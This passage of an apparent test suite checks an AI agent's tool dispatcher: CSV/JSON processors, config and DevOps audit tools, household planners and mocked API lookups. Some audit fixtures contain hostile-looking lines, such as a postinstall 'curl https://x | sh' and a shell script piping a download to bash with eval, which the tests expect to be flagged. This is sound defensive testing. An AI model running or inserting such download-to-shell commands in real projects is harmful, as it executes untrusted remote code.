    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-empty-row-report",content:"a,b\n1,2\n,\n"})).toContain("Empty rows: 1");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-row-width-report",content:"a,b\n1,2\n3"})).toContain('"line":3');

    const cleaned=JSON.parse(await executeAgentTool(env,"process_text_content",{tool_id:"json-remove-empty-values",content:'{"zero":0,"flag":false,"empty":"","nil":null,"items":[],"nested":{"keep":"yes","drop":null}}'}));
    expect(cleaned).toEqual({zero:0,flag:false,nested:{keep:"yes"}});
    const types=await executeAgentTool(env,"process_text_content",{tool_id:"json-to-typescript",content:'{"name":"An","profile":{"age":17}}'});
    expect(types).toContain("export interface RootProfile");
    expect(types).toContain("export type RootType = Root;");
    const report=await executeAgentTool(env,"process_text_content",{tool_id:"json-nesting-report",content:'{"items":[{"name":"An"}]}'});
    expect(report).toContain("Maximum depth: 3");
    expect(report).toContain("Objects: 2");
  });



  it("executes safe Wave 8 configuration and DevOps text tools through AI function calls", async () => {
    const envText="APP_ENV=production\nAPI_TOKEN=super-secret-value\nAPI_TOKEN=second-secret\nEMPTY=\n";
    const audit=await executeAgentTool(env,"process_text_content",{tool_id:"env-audit",content:envText});
    expect(audit).toContain("Duplicate keys: 1");
    expect(audit).toContain("Secret-like variable names: 1");
    expect(audit).not.toContain("super-secret-value");
    const redacted=await executeAgentTool(env,"process_text_content",{tool_id:"env-redact",content:envText});
    expect(redacted).toContain("API_TOKEN=[REDACTED]");
    expect(redacted).not.toContain("second-secret");
    const example=await executeAgentTool(env,"process_text_content",{tool_id:"env-to-example",content:envText});
    expect(example).toContain("API_TOKEN=");
    expect(example).not.toContain("super-secret-value");
    const ini=await executeAgentTool(env,"process_text_content",{tool_id:"ini-to-json",content:"[app]\nname=demo\nport=8080"});
    expect(JSON.parse(ini).app.port).toBe("8080");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"ini-validate",content:"[app]\nname=demo"})).toContain("Status: valid");
    const docker=await executeAgentTool(env,"process_text_content",{tool_id:"dockerfile-audit",content:"FROM ubuntu:latest\nADD x.tar /app\nENV API_KEY=do-not-leak\n"});
    expect(docker).toContain("base image ubuntu:latest");
    expect(docker).toContain("secret-like ENV key API_KEY");
    expect(docker).not.toContain("do-not-leak");
    const requirements=await executeAgentTool(env,"process_text_content",{tool_id:"requirements-audit",content:"requests>=2\nrequests==2.31.0\nprivate @ https://example.test/pkg.whl"});
    expect(requirements).toContain("Duplicate packages: 1");
    expect(requirements).toContain("Direct URL/VCS references: 1");
    const packageAudit=await executeAgentTool(env,"process_text_content",{tool_id:"package-json-audit",content:'{"name":"demo","dependencies":{"a":"*","b":"git+https://x"},"scripts":{"postinstall":"curl https://x | sh"}}'});
    expect(packageAudit).toContain("Wildcard/latest specs: 1");
    expect(packageAudit).toContain("download-to-shell");
    const ignore=await executeAgentTool(env,"process_text_content",{tool_id:"gitignore-audit",content:"node_modules/\ndist/"});
    expect(ignore).toContain("MISSING protection: .env");
    const refs=await executeAgentTool(env,"process_text_content",{tool_id:"env-reference-report",content:'process.env.API_KEY; import.meta.env.PUBLIC_URL; os.environ["DATABASE_URL"]; $CACHE_KEY'});
    expect(refs).toContain("API_KEY");
    expect(refs).toContain("PUBLIC_URL");
    expect(refs).toContain("DATABASE_URL");
    expect(refs).toContain("CACHE_KEY");
  });



  it("runs Wave 9 text-only infrastructure audits without executing source", async () => {
    const terraform=await executeAgentTool(env,"process_text_content",{tool_id:"terraform-audit",content:'resource "aws_security_group_rule" "open" {\n cidr_blocks = ["0.0.0.0/0"]\n password = "must-not-leak"\n storage_encrypted = false\n}'});
    expect(terraform).toContain("public ingress CIDR");
    expect(terraform).toContain("credential-looking literal assignment");
    expect(terraform).not.toContain("must-not-leak");
    const nginx=await executeAgentTool(env,"process_text_content",{tool_id:"nginx-config-audit",content:"server {\n listen 443 ssl;\n server_tokens on;\n autoindex on;\n ssl_protocols TLSv1 TLSv1.2;\n}"});
    expect(nginx).toContain("server_tokens is enabled");
    expect(nginx).toContain("weak TLS protocol");
    const apache=await executeAgentTool(env,"process_text_content",{tool_id:"apache-config-audit",content:"ServerTokens Full\nServerSignature On\nOptions Indexes\nTraceEnable On"});
    expect(apache).toContain("directory listing Indexes");
    expect(apache).toContain("TRACE method is enabled");
    const caddy=await executeAgentTool(env,"process_text_content",{tool_id:"caddy-config-audit",content:":80 {\n auto_https off\n reverse_proxy localhost:8080 {\n  transport http {\n   tls_insecure_skip_verify\n  }\n }\n}"});
    expect(caddy).toContain("automatic HTTPS is disabled");
    expect(caddy).toContain("upstream TLS verification is disabled");
    const systemd=await executeAgentTool(env,"process_text_content",{tool_id:"systemd-unit-audit",content:"[Service]\nUser=root\nExecStart=/bin/sh -c 'echo hi'\nNoNewPrivileges=no\nProtectSystem=no\nPrivateTmp=no"});
    expect(systemd).toContain("service runs as root");
    expect(systemd).toContain("shell -c wrapper");
    const shell=await executeAgentTool(env,"process_text_content",{tool_id:"shell-script-audit",content:"#!/bin/bash\nAPI_TOKEN='secret-no-leak'\neval \"$CMD\"\ncurl https://x.test/a | bash\nchmod 777 /tmp/a"});
    expect(shell).toContain("eval executes");
    expect(shell).toContain("download piped directly");
    expect(shell).not.toContain("secret-no-leak");
  });

  it("runs Wave 44 everyday life planners through AI-callable tools", async () => {
    const run = (tool_id: string, value: Record<string, unknown>) =>
      executeAgentTool(env, "process_text_content", { tool_id, content: JSON.stringify(value) });

    const pantry = await run("pantry-use-first-planner", {
      as_of_date: "2026-11-24", items: [{ name: "Milk", date: "2026-11-25", date_type: "use_by" }],
    });
    expect(pantry).toContain("Milk");
    expect(pantry).toContain("Within planning window");

    const recipes = await run("pantry-recipe-matcher", {
      available_ingredients: ["Rice", "Egg", "Scallion"],
      recipes: [{ name: "Fried rice", ingredients: ["Rice", "Egg", "Scallion"] }],
    });
    expect(recipes).toContain("Fried rice");
    expect(recipes).toContain("100% ingredient match");

    const prep = await run("meal-prep-timeline-planner", {
      start_time: "16:00", tasks: [{ id: "chop", name: "Chop vegetables", duration_minutes: 10, resource: "hands" }],
    });
    expect(prep).toContain("16:00–16:10 | Chop vegetables");

    const laundry = await run("laundry-load-organizer", {
      machine_capacity_kg: 5, items: [{ name: "White shirt", weight_kg: 0.3, color_group: "white", fabric_group: "normal", drying: "air", max_temp_c: 40 }],
    });
    expect(laundry).toContain("White shirt");

    const trip = await run("trip-itinerary-planner", {
      start_time: "09:00", end_time: "12:00",
      stops: [{ name: "Museum", travel_minutes_from_previous: 20, duration_minutes: 60 }],
    });
    expect(trip).toContain("09:20–10:20 | Visit Museum");

    const vehicle = await run("vehicle-maintenance-planner", {
      as_of_date: "2026-11-24", current_odometer_km: 10000, maintenance: [{
        name: "Engine oil", last_service_date: "2025-11-24", last_service_odometer_km: 5000, interval_months: 12, interval_km: 5000,
      }],
    });
    expect(vehicle).toContain("Engine oil");
    expect(vehicle).toContain("DUE NOW / OVERDUE");

    const documents = await run("document-renewal-planner", {
      as_of_date: "2026-11-24", documents: [{ name: "Passport", expiry_date: "2027-03-01", remind_days_before: 60 }],
    });
    expect(documents).toContain("Passport");
    expect(documents).toContain("Renewal window approaching");

    const warranty = await run("warranty-claim-assistant", {
      as_of_date: "2026-11-24", product_name: "Laptop", seller: "Example Store",
      purchase_date: "2025-01-31", warranty_months: 24, issue_description: "Display flickers.", language: "vi",
    });
    expect(warranty).toContain("Bản nháp yêu cầu kiểm tra bảo hành");
    expect(warranty).toContain("2027-01-31");
  });

  it("runs Wave 45 finance and moving-life tools through AI-callable tools", async () => {
    const run = (tool_id: string, value: Record<string, unknown>) =>
      executeAgentTool(env, "process_text_content", { tool_id, content: JSON.stringify(value) });

    const bank = await run("bank-csv-expense-analyzer", {
      transactions: [
        { date: "2026-11-01", description: "Salary", amount: 1000, currency: "USD", category: "Income" },
        { date: "2026-11-02", description: "Food", amount: -100, currency: "USD", category: "Food" },
      ],
    });
    expect(bank).toContain("USD: income 1000; expenses 100; net 900");
    expect(bank).toContain("Food | expenses 100");

    const cashflow = await run("bill-cashflow-calendar-planner", {
      as_of_date: "2026-11-24", horizon_days: 10, opening_balances: [{ currency: "VND", amount: 1000 }],
      events: [{ name: "Rent", amount: 100, currency: "VND", direction: "expense", first_date: "2026-11-25", recurrence: "once" }],
    });
    expect(cashflow).toContain("projected balance 900 VND");

    const settlement = await run("shared-expense-settler", {
      currency: "VND", participants: ["A", "B"],
      expenses: [{ name: "Dinner", amount: 100, paid_by: "A" }],
    });
    expect(settlement).toContain("B pays A: 50 VND");

    const move = await run("moving-day-checklist-planner", {
      as_of_date: "2026-11-24", move_date: "2026-11-30",
      tasks: [{ name: "Book van", days_before_move: 2, assignee: "A" }],
    });
    expect(move).toContain("2026-11-28 | Book van | Upcoming");

    const boxes = await run("moving-box-label-maker", {
      boxes: [{ box_id: "K1", room: "Kitchen", contents: ["Plates"], fragile: true }],
    });
    expect(boxes).toContain("BOX K1");
    expect(boxes).toContain("FLAGS: FRAGILE");

    const returns = await run("return-deadline-tracker", {
      as_of_date: "2026-11-24",
      purchases: [{ product: "Headphones", seller: "Store", purchase_date: "2026-11-20", return_window_days: 14, remind_days_before: 20 }],
    });
    expect(returns).toContain("Check return now");

    const gifts = await run("gift-budget-planner", {
      currency: "VND", total_budget: 100,
      recipients: [{ name: "A", budget: 50, gifts: [{ item: "Book", price: 30, purchased: true }] }],
    });
    expect(gifts).toContain("Overall budget remaining: 70 VND");
    expect(gifts).toContain("Already purchased: 30 VND");

    const kit = await run("household-emergency-kit-planner", {
      household_size: 3, days: 2,
      items: [{ name: "Water", unit: "L", per_person_per_day: 2, per_household: 1, on_hand: 5 }],
    });
    expect(kit).toContain("Water: target 13 L | on hand 5 L | still needed 8 L");
    expect(kit).toContain("not an official safety standard");
  });

  it("runs Wave 46 home, vehicle and rental tools through AI-callable tools", async () => {
    const run = (tool_id: string, value: Record<string, unknown>) =>
      executeAgentTool(env, "process_text_content", { tool_id, content: JSON.stringify(value) });

    const fuel = await run("vehicle-fuel-log-analyzer", {
      currency: "VND",
      entries: [
        { date: "2026-01-01", odometer_km: 10000, litres: 40, price_per_litre: 25000, full_tank: true },
        { date: "2026-01-31", odometer_km: 10400, litres: 32, price_per_litre: 26000, full_tank: true },
      ],
    });
    expect(fuel).toContain("400 km | 32 L | 8 L/100 km");

    const ownership = await run("vehicle-ownership-cost-report", {
      currency: "VND", distance_km: 1000,
      expenses: [{ date: "2026-01-01", name: "Fuel", category: "Fuel", amount: 500000 }],
    });
    expect(ownership).toContain("Recorded cost per kilometre: 500 VND/km");

    const replace = await run("appliance-repair-replace-comparator", {
      appliance_name: "Fridge", currency: "USD",
      repair_cost: 200, expected_years_after_repair: 4, annual_energy_cost_after_repair: 120,
      replacement_cost: 800, replacement_expected_life_years: 10, replacement_annual_energy_cost: 70,
    });
    expect(replace).toContain("Replacement has the lower annualised cost proxy by 20 USD/year");

    const quotes = await run("home-repair-quote-comparator", {
      project_name: "Bathroom", currency: "VND",
      required_work: [{ id: "pipe", description: "Pipe replacement" }],
      quotes: [{ provider: "A", labour_cost: 100, materials_cost: 50, included_work_ids: ["pipe"] }],
    });
    expect(quotes).toContain("A — 150 VND");
    expect(quotes).toContain("Scope included: 1/1");

    const moveIn = await run("rental-move-in-inspection-report", {
      property: "Unit 1", tenant: "A", landlord_or_agent: "B", inspection_date: "2026-11-24",
      checks: [{ area: "Kitchen", item: "Tap", condition: "good", evidence_refs: ["tap.jpg"] }],
    });
    expect(moveIn).toContain("Kitchen | Tap | good");
    expect(moveIn).toContain("tap.jpg");

    const moveOut = await run("rental-move-out-condition-report", {
      property: "Unit 1", tenant: "A", move_in_date: "2026-01-01", move_out_date: "2026-11-24",
      move_in_checks: [{ id: "tap", area: "Kitchen", item: "Tap", condition: "good" }],
      move_out_checks: [{ id: "tap", area: "Kitchen", item: "Tap", condition: "worn" }],
    });
    expect(moveOut).toContain("Condition label changed");
    expect(moveOut).toContain("Arithmetic remainder: 0 VND");

    const rents = await run("rental-offer-cost-comparator", {
      currency: "VND", lease_months: 12,
      offers: [{ name: "A", monthly_rent: 100, refundable_deposit: 200 }],
    });
    expect(rents).toContain("Estimated 12-month cost excluding refundable deposit: 1200 VND");
    expect(rents).toContain("Cash required at start");

    const service = await run("appliance-service-history-report", {
      as_of_date: "2026-11-24",
      appliances: [{ name: "Washer", currency: "VND", purchase_date: "2025-01-01", warranty_months: 24,
        service_entries: [{ date: "2026-03-01", event: "Pump repair", cost: 500000, downtime_days: 2 }] }],
    });
    expect(service).toContain("Pump repair (1)");
    expect(service).toContain("recorded service spend: 500000 VND");
  });

  it("routes live currency conversion through the model-callable tool interface", async () => {
    const fetchMock = vi.fn(async (input: RequestInfo | URL) => {
      const url = new URL(String(input));
      expect(url.hostname).toBe("api.frankfurter.dev");
      return new Response(JSON.stringify({ date: "2026-11-23", base: "USD", quote: "VND", rate: 26350 }), {
        status: 200, headers: { "content-type": "application/json" },
      });
    });
    vi.stubGlobal("fetch", fetchMock);
    const result = JSON.parse(await executeAgentTool(env, "convert_currency", {
      base_currency: "USD", quote_currency: "VND", amount: 2,
    }));
    expect(result.converted_amount).toBe(52700);
    expect(result.reference_date).toBe("2026-11-23");
  });

  it("exposes all Wave 48 discovery tools to the model and dispatches postcode lookup", async () => {
    const names = AGENT_TOOL_DEFINITIONS.map(tool => tool.function.name);
    expect(names).toEqual(expect.arrayContaining([
      "get_marine_forecast", "get_earthquake_activity", "search_books", "lookup_postal_code",
    ]));
    vi.stubGlobal("fetch", vi.fn(async () => new Response(JSON.stringify({
      "post code": "90210", country: "United States", "country abbreviation": "US",
      places: [{ "place name": "Beverly Hills", state: "California", "state abbreviation": "CA", latitude: "34.0901", longitude: "-118.4065" }],
    }), { status: 200, headers: { "content-type": "application/json" } })));
    const result = JSON.parse(await executeAgentTool(env, "lookup_postal_code", { country_code: "US", postal_code: "90210" }));
    expect(result.places[0].place_name).toBe("Beverly Hills");
  });

  it("exposes all Wave 49 learning and discovery tools and dispatches a NASA event lookup", async () => {
    const names = AGENT_TOOL_DEFINITIONS.map(tool => tool.function.name);
    expect(names).toEqual(expect.arrayContaining([
      "define_english_word", "search_public_domain_books", "search_museum_artworks", "get_natural_events", "get_local_time",
    ]));
    vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL) => {
      const url = new URL(String(input));
      expect(url.hostname).toBe("eonet.gsfc.nasa.gov");
      return new Response(JSON.stringify({
        events: [{ id: "EONET_123", title: "Test wildfire", link: "https://eonet.gsfc.nasa.gov/api/v3/events/EONET_123", closed: null,
          categories: [{ id: "wildfires", title: "Wildfires" }], sources: [],
          geometry: [{ date: "2026-11-24T00:00:00Z", type: "Point", coordinates: [106.7,20.8] }] }],
      }), { status: 200, headers: { "content-type": "application/json" } });
    }));
    const result = JSON.parse(await executeAgentTool(env, "get_natural_events", { category: "wildfires", days_back: 7 }));
    expect(result.events[0].title).toBe("Test wildfire");
    expect(result.events[0].recent_geometry[0].point.latitude).toBe(20.8);
  });


  it("exposes Wave 50 discovery functions to the model and routes a TVmaze search", async () => {
    const names = AGENT_TOOL_DEFINITIONS.map(tool => tool.function.name);
    expect(names).toEqual(expect.arrayContaining([
      "search_tv_shows", "get_tv_show_episodes", "search_apple_media", "search_music_metadata", "search_scholarly_works",
    ]));
    vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL) => {
      const url = new URL(String(input));
      expect(url.hostname).toBe("api.tvmaze.com");
      expect(url.pathname).toBe("/search/shows");
      return new Response(JSON.stringify([{ score: 0.98, show: {
        id: 42, name: "Example Show", genres: ["Drama"], status: "Ended",
        url: "https://www.tvmaze.com/shows/42/example-show",
      } }]), { status: 200, headers: { "content-type": "application/json" } });
    }));
    const result = JSON.parse(await executeAgentTool(env, "search_tv_shows", { query: "Example Show" }));
    expect(result.shows[0].name).toBe("Example Show");
    expect(result.shows[0].tvmaze_url).toContain("tvmaze.com");
  });

});
